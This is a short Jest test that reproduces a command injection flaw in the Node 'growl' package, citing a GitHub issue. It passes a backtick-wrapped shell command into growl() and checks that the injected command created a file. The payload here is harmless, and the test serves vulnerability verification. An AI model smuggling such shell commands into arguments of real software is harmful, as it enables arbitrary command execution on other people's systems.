//https://github.com/tj/node-growl/issues/60
test("Command Injection in growl", () => {
  const growl = require("growl");
  const fs = require("fs");
  const path = "./growl";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  growl("`touch growl`");

  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
